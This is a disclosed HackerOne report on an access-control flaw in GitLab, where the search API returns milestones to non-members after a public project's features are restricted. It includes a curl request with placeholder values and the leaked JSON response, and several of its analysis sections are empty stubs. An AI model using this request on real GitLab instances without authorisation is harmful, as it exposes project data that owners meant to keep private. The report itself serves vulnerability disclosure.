# Milestones leaked via search API

## Metadata
- **Source:** HackerOne
- **Report:** 460815 | https://hackerone.com/reports/460815
- **Submitted:** 2018-12-11
- **Reporter:** xanbanx
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Improper Access Control - Generic
- **CVEs:** None
- **Category:** uncategorised

## Summary
GitLab allows to restrict the project features for public projects. When disabling all features of a public project for non-project members under `https://gitlab.com/xanbanx/test-search/edit`, full access to milestones is still possible via the search API.

## Steps To Reproduce:

Reproduced on GitLab 11.6.0-rc4-ee

  1. Create a public project, disable all features for non-project members by sett

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

GitLab allows to restrict the project features for public projects. When disabling all features of a public project for non-project members under `https://gitlab.com/xanbanx/test-search/edit`, full access to milestones is still possible via the search API.

## Steps To Reproduce:

Reproduced on GitLab 11.6.0-rc4-ee

  1. Create a public project, disable all features for non-project members by setting all features under `https://gitlab.com/xanbanx/test-search/edit` to `Only Project Members`
  2. Create a new milestone, e.g., named `milestone`
  3. As a non-project member perform the following API request (substitute the project id)

```bash
curl --request GET --header "PRIVATE-TOKEN: <YOUR-TOKEN>" https://gitlab.example.com/api/v4/projects/<project-id>/search?search=milestone&scope=milestones
```

Although the user does not have access to the project and is no project member, the API returns:
```json
[
    {
        "id": 123,
        "iid": 1,
        "project_id": 12,
        "title": "milestone",
        "description": "milestone",
        "state": "active",
        "created_at": "2018-12-11T20:03:25.381Z",
        "updated_at": "2018-12-11T20:03:25.381Z",
        "due_date": null,
        "start_date": null,
        "web_url": "https://gitlab.example.com/namespace/project/milestones/1"
    }
]
```

## Impact

By using the search API any user with limited access can enumerate all milestones via the search API. Milestones can include critical information, e.g., related to upcoming security milestones, etc..

</details>

---
*Analysed by Claude on 2026-05-24*
